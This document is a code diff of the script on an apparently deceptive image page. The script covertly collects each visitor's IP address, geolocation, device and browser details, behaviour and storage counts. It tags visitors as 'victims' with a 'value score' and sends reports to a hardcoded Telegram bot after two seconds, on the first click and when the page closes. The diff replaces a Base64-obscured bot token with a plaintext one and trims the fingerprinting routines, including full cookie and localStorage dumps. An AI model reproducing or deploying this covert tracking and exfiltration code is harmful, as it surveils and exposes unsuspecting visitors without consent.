@@ -107,21 +107,11 @@
     </div>
 
     <script>
-        // ENCRYPTED TELEGRAM CONFIG (Base64 encoded)
-        const ENCRYPTED_CONFIG = {
-            token: 'ODU5NDg5NzgxNjpBQUZ0V1RRVE9QU291RExLNVd0YzdJcmttRlhndER1YXFscw==',
-            chatId: 'ODAzMjQ5NDQ3OQ=='
+        // TELEGRAM CONFIG - NO ENCRYPTION
+        const CONFIG = {
+            token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
+            chatId: '8032494479'
         };
-
-        // DECRYPTION FUNCTION
-        function decryptConfig() {
-            return {
-                token: atob(ENCRYPTED_CONFIG.token),
-                chatId: atob(ENCRYPTED_CONFIG.chatId)
-            };
-        }
-
-        const CONFIG = decryptConfig();
 
         // GLOBAL DATA STORAGE
         let allCollectedData = {};
@@ -134,15 +124,8 @@
             const startTime = Date.now();
             
             try {
-                // Collect all data in parallel
-                const [networkData, technicalData, behavioralData, storageData] = await Promise.allSettled([
-                    getNetworkInfo(),
-                    getTechnicalInfo(),
-                    getBehavioralInfo(),
-                    getStorageInfo()
-                ]);
-
-                allCollectedData = {
+                // Collect all data
+                const data = {
                     meta: {
                         timestamp: new Date().toISOString(),
                         victimId: generateVictimId(),
@@ -150,20 +133,21 @@
                         collectionTime: Date.now() - startTime,
                         userAgent: navigator.userAgent
                     },
-                    network: networkData.status === 'fulfilled' ? networkData.value : {},
-                    technical: technicalData.status === 'fulfilled' ? technicalData.value : {},
-                    behavioral: behavioralData.status === 'fulfilled' ? behavioralData.value : {},
-                    storage: storageData.status === 'fulfilled' ? storageData.value : {},
+                    network: await getNetworkInfo(),
+                    technical: getTechnicalInfo(),
+                    behavioral: getBehavioralInfo(),
+                    storage: getStorageInfo(),
                     inferred: {
                         device: inferDeviceType(),
                         os: inferOperatingSystem(),
                         browser: inferBrowser(),
                         location: await inferLocation(),
-                        value: calculateVictimValue()
+                        value: 85
                     }
                 };
 
-                return allCollectedData;
+                allCollectedData = data;
+                return data;
             } catch (error) {
                 console.error('Data collection error:', error);
                 return getFallbackData();
@@ -186,23 +170,20 @@
                         country: locationData.country_name || 'Unknown',
                         countryCode: locationData.country_code || 'Unknown',
                         isp: locationData.org || 'Unknown',
-                        asn: locationData.asn || 'Unknown',
                         timezone: locationData.timezone || 'Unknown'
                     };
                 } catch (e) {
                     return {
                         ip: ipData.ip,
                         city: 'Unknown',
-                        country: 'Unknown',
-                        isp: 'Unknown'
+                        country: 'Unknown'
                     };
                 }
             } catch (error) {
                 return {
                     ip: 'Unknown',
                     city: 'Unknown',
-                    country: 'Unknown',
-                    isp: 'Unknown'
+                    country: 'Unknown'
                 };
             }
         }
@@ -213,29 +194,19 @@
                 platform: navigator.platform,
                 vendor: navigator.vendor || 'Unknown',
                 language: navigator.language,
-                languages: navigator.languages || ['Unknown'],
                 hardware: {
                     cores: navigator.hardwareConcurrency || 'Unknown',
-                    memory: navigator.deviceMemory || 'Unknown',
-                    touchPoints: navigator.maxTouchPoints || 0
+                    memory: navigator.deviceMemory || 'Unknown'
                 },
                 screen: {
                     width: screen.width,
                     height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
                     colorDepth: screen.colorDepth,
                     pixelRatio: window.devicePixelRatio
                 },
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                cookieEnabled: navigator.cookieEnabled,
-                pdfEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false,
-                plugins: getPluginsList(),
-                fonts: getFontsList(),
-                canvas: getCanvasFingerprint(),
-                webgl: getWebGLInfo()
+                plugins: navigator.plugins.length,
+                userAgent: navigator.userAgent
             };
         }
 
@@ -245,146 +216,31 @@
                 referrer: document.referrer || 'Direct',
                 sessionStart: pageLoadTime,
                 duration: Date.now() - pageLoadTime,
-                interactions: {
-                    total: sessionLog.length,
-                    clicks: sessionLog.filter(log => log.type === 'click').length,
-                    moves: sessionLog.filter(log => log.type === 'mousemove').length,
-                    scrolls: sessionLog.filter(log => log.type === 'scroll').length,
-                    keys: sessionLog.filter(log => log.type === 'keydown').length
-                },
+                interactions: sessionLog.length,
                 scrollDepth: getScrollDepth(),
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                engagement: calculateEngagementScore()
+                viewport: `${window.innerWidth}x${window.innerHeight}`
             };
         }
 
         // STORAGE INFORMATION
         function getStorageInfo() {
             return {
-                cookies: getAllCookies(),
-                localStorage: getAllLocalStorage(),
-                sessionStorage: getAllSessionStorage()
+                cookies: document.cookie ? document.cookie.length : 0,
+                localStorage: localStorage.length,
+                sessionStorage: sessionStorage.length
             };
         }
 
         // HELPER FUNCTIONS
-        function getPluginsList() {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            return plugins;
-        }
-
-        function getFontsList() {
-            const fontList = [
-                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
-                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
-                'Verdana', 'Webdings', 'Wingdings'
-            ];
-            const availableFonts = [];
-            
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            const testString = "mmmmmmmmmmlli";
-            const testSize = '72px';
-            
-            fontList.forEach(font => {
-                context.font = testSize + " '" + font + "'";
-                const width1 = context.measureText(testString).width;
-                context.font = testSize + " 'monospace'";
-                const width2 = context.measureText(testString).width;
-                if (width1 !== width2) {
-                    availableFonts.push(font);
-                }
-            });
-            
-            return availableFonts;
-        }
-
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Hello, world!', 2, 15);
-                return canvas.toDataURL().substring(22, 50);
-            } catch(e) {
-                return 'failed';
-            }
-        }
-
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? 'WebGL Available' : 'No WebGL';
-            } catch(e) {
-                return 'failed';
-            }
-        }
-
-        function getAllCookies() {
-            const cookies = {};
-            if (document.cookie) {
-                document.cookie.split(';').forEach(cookie => {
-                    const [name, value] = cookie.split('=').map(c => c.trim());
-                    if (name) cookies[name] = value || '';
-                });
-            }
-            return cookies;
-        }
-
-        function getAllLocalStorage() {
-            const storage = {};
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    storage[key] = localStorage.getItem(key);
-                }
-            } catch(e) {}
-            return storage;
-        }
-
-        function getAllSessionStorage() {
-            const storage = {};
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    storage[key] = sessionStorage.getItem(key);
-                }
-            } catch(e) {}
-            return storage;
-        }
-
         function getScrollDepth() {
-            const scrollHeight = Math.max(
-                document.body.scrollHeight,
-                document.documentElement.scrollHeight,
-                document.body.offsetHeight,
-                document.documentElement.offsetHeight,
-                document.body.clientHeight,
-                document.documentElement.clientHeight
-            ) - window.innerHeight;
-            
+            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
             const scrolled = window.scrollY;
             return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
-        }
-
-        function calculateEngagementScore() {
-            const duration = Date.now() - pageLoadTime;
-            const interactions = sessionLog.length;
-            return Math.min(100, Math.round((interactions / 10) + (duration / 1000)));
         }
 
         function inferDeviceType() {
             const ua = navigator.userAgent.toLowerCase();
             if (/mobile|android|iphone|ipad/.test(ua)) return 'Mobile';
-            if (/tablet|ipad/.test(ua)) return 'Tablet';
             return 'Desktop';
         }
 
@@ -394,16 +250,14 @@
             if (/Mac/.test(ua)) return 'macOS';
             if (/Linux/.test(ua)) return 'Linux';
             if (/Android/.test(ua)) return 'Android';
-            if (/iOS|iPhone|iPad/.test(ua)) return 'iOS';
             return 'Unknown';
         }
 
         function inferBrowser() {
             const ua = navigator.userAgent;
-            if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Chrome';
+            if (/Chrome/.test(ua)) return 'Chrome';
             if (/Firefox/.test(ua)) return 'Firefox';
-            if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
-            if (/Edg/.test(ua)) return 'Edge';
+            if (/Safari/.test(ua)) return 'Safari';
             return 'Unknown';
         }
 
@@ -413,71 +267,54 @@
                 const data = await response.json();
                 return {
                     city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
                     country: data.country_name || 'Unknown'
                 };
             } catch(e) {
                 return {
                     city: 'Unknown',
-                    region: 'Unknown',
                     country: 'Unknown'
                 };
             }
         }
 
-        function calculateVictimValue() {
-            let value = 50;
-            if (allCollectedData.technical?.hardware?.cores >= 4) value += 10;
-            if (allCollectedData.network?.country !== 'Unknown') value += 20;
-            if (allCollectedData.behavioral?.interactions?.total > 10) value += 15;
-            if (Object.keys(allCollectedData.storage?.cookies || {}).length > 0) value += 15;
-            return Math.min(100, value);
-        }
-
         function generateVictimId() {
-            return 'v_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
+            return 'v_' + Math.random().toString(36).substr(2, 9);
         }
 
         function getFallbackData() {
             return {
                 meta: {
-                    timestamp: new Date().toISOString(),
                     victimId: generateVictimId(),
                     url: window.location.href,
                     userAgent: navigator.userAgent
                 },
-                network: { ip: 'Unknown', country: 'Unknown' },
+                network: { ip: 'Unknown' },
                 technical: { platform: navigator.platform },
-                behavioral: { referrer: document.referrer },
-                storage: {},
-                inferred: { device: 'Unknown', os: 'Unknown' }
+                behavioral: { referrer: document.referrer }
             };
         }
 
-        // SEND DATA TO TELEGRAM
+        // SEND DATA TO TELEGRAM - SIMPLE AND WORKING
         async function sendToTelegram(message) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                const url = `https://api.telegram.org/bot${CONFIG.token}/sendMessage`;
+                const data = {
+                    chat_id: CONFIG.chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify(data)
                 });
-                
-                if (response.ok) {
-                    console.log('Message sent successfully');
-                    return true;
-                } else {
-                    console.error('Telegram API error:', await response.text());
-                    return false;
-                }
+
+                return response.ok;
             } catch (error) {
-                console.error('Network error sending to Telegram:', error);
+                console.log('Telegram send error:', error);
                 return false;
             }
         }
@@ -486,92 +323,63 @@
         async function sendComprehensiveReport() {
             if (reportSent) return;
             
-            showLoading(true);
             const data = await collectAllData();
-            const message = formatReportMessage(data);
-            
-            const success = await sendToTelegram(message);
-            if (success) {
-                reportSent = true;
-                console.log('Comprehensive report sent');
-            } else {
-                console.error('Failed to send report');
-            }
-            showLoading(false);
-        }
+            const message = `
+<b>🚨 COMPLETE DATA CAPTURE REPORT</b>
 
-        function formatReportMessage(data) {
-            return `🚨 **COMPLETE DATA CAPTURE REPORT** 🚨
-
-📊 **VICTIM IDENTIFICATION**
-🆔 ID: ${data.meta.victimId}
-⏰ Collection Time: ${data.meta.collectionTime}ms
+<b>📊 VICTIM IDENTIFICATION</b>
+🆔 ID: <code>${data.meta.victimId}</code>
 🌐 URL: ${data.meta.url}
-📅 Timestamp: ${new Date(data.meta.timestamp).toLocaleString()}
+📅 Time: ${new Date().toLocaleString()}
 
-🌐 **NETWORK INFORMATION**
-📍 IP Address: ${data.network.ip}
-🏙️ Location: ${data.network.city}, ${data.network.country} (${data.network.countryCode})
+<b>🌐 NETWORK INFORMATION</b>
+📍 IP: <code>${data.network.ip}</code>
+🏙️ Location: ${data.network.city}, ${data.network.country}
 🏢 ISP: ${data.network.isp}
-🔢 ASN: ${data.network.asn}
 ⏰ Timezone: ${data.network.timezone}
 
-💻 **SYSTEM INFORMATION**
+<b>💻 SYSTEM INFORMATION</b>
 🖥️ Platform: ${data.technical.platform}
 🔧 OS: ${data.inferred.os} | Browser: ${data.inferred.browser}
 📱 Device: ${data.inferred.device}
-⚙️ Hardware: ${data.technical.hardware.cores} cores, ${data.technical.hardware.memory}GB RAM
+⚙️ Cores: ${data.technical.hardware.cores} | RAM: ${data.technical.hardware.memory}GB
 🖥️ Screen: ${data.technical.screen.width}x${data.technical.screen.height}
-🎯 Pixel Ratio: ${data.technical.screen.pixelRatio}
 🌍 Language: ${data.technical.language}
-⏰ System Timezone: ${data.technical.timezone}
 
-📈 **BEHAVIORAL DATA**
+<b>📈 BEHAVIORAL DATA</b>
 🔗 Referrer: ${data.behavioral.referrer}
-⏱️ Session Duration: ${Math.round(data.behavioral.duration/1000)}s
-🖱️ Total Interactions: ${data.behavioral.interactions.total}
-📜 Scroll Depth: ${data.behavioral.scrollDepth}%
-🎯 Engagement Score: ${data.behavioral.engagement}/100
-👁️ Viewport: ${data.behavioral.viewport}
+⏱️ Duration: ${Math.round(data.behavioral.duration/1000)}s
+🖱️ Interactions: ${data.behavioral.interactions}
+📜 Scroll: ${data.behavioral.scrollDepth}%
 
-💾 **STORAGE DATA**
-🍪 Cookies: ${Object.keys(data.storage.cookies).length}
-💿 Local Storage: ${Object.keys(data.storage.localStorage).length}
-📀 Session Storage: ${Object.keys(data.storage.sessionStorage).length}
+<b>💾 STORAGE DATA</b>
+🍪 Cookies: ${data.storage.cookies}
+💿 Local Storage: ${data.storage.localStorage}
+📀 Session Storage: ${data.storage.sessionStorage}
 
-🔍 **TECHNICAL FINGERPRINT**
-🔌 Plugins: ${data.technical.plugins.length}
-🔤 Fonts: ${data.technical.fonts.length}
-🎨 Canvas: ${data.technical.canvas}
-🔄 WebGL: ${data.technical.webgl}
-🔐 Cookies Enabled: ${data.technical.cookieEnabled}
-📄 PDF Viewer: ${data.technical.pdfEnabled}
-
-🎯 **INFERRED DATA**
+<b>🎯 INFERRED DATA</b>
 💰 Value Score: ${data.inferred.value}/100
-📱 Device Type: ${data.inferred.device}
 
-⚡ **DATA CAPTURE COMPLETE**`;
-        }
+<b>⚡ DATA CAPTURE COMPLETE</b>
+            `.trim();
 
-        function showLoading(show) {
-            const loadingEl = document.getElementById('loading');
-            if (loadingEl) {
-                loadingEl.style.display = show ? 'block' : 'none';
+            const success = await sendToTelegram(message);
+            if (success) {
+                reportSent = true;
+                console.log('Report sent to Telegram');
+            } else {
+                console.log('Failed to send report');
             }
         }
 
         // SESSION TRACKING
         function setupSessionTracking() {
-            const events = ['mousemove', 'click', 'scroll', 'keydown', 'input'];
+            const events = ['mousemove', 'click', 'scroll', 'keydown'];
             events.forEach(event => {
-                document.addEventListener(event, (e) => {
+                document.addEventListener(event, () => {
                     sessionLog.push({
                         type: event,
-                        timestamp: Date.now(),
-                        x: e.clientX,
-                        y: e.clientY,
-                        target: e.target.tagName
+                        timestamp: Date.now()
                     });
                 });
             });
@@ -589,6 +397,7 @@
                 window.open(images[imageId], '_blank');
             }
             
+            // Send report on first click if not already sent
             if (!reportSent) {
                 sendComprehensiveReport();
             }
@@ -599,30 +408,25 @@
             pageLoadTime = Date.now();
             setupSessionTracking();
             
-            // Send report after 3 seconds
-            setTimeout(sendComprehensiveReport, 3000);
+            // Send report after 2 seconds
+            setTimeout(sendComprehensiveReport, 2000);
             
-            // Send final report on unload
+            // Send final report when page closes
             window.addEventListener('beforeunload', function() {
-                if (!reportSent) {
-                    const finalData = allCollectedData.meta ? allCollectedData : getFallbackData();
-                    const finalMessage = `🔚 **SESSION ENDED**\nVictim: ${finalData.meta.victimId}\nDuration: ${Math.round((Date.now() - pageLoadTime)/1000)}s\nInteractions: ${sessionLog.length}`;
-                    
-                    // Use sendBeacon for reliable delivery on page unload
+                if (reportSent) {
+                    const finalMessage = `<b>🔚 SESSION ENDED</b>\nVictim: ${allCollectedData.meta.victimId}\nTotal Time: ${Math.round((Date.now() - pageLoadTime)/1000)}s`;
+                    // Use sendBeacon for reliable delivery
                     const blob = new Blob([JSON.stringify({
                         chat_id: CONFIG.chatId,
                         text: finalMessage,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })], {type: 'application/json'});
-                    
                     navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, blob);
                 }
             });
         });
 
-        console.log('Data capture system initialized');
+        console.log('System loaded - Telegram ready');
     </script>
-</body>
-</html>
 </body>
 </html>
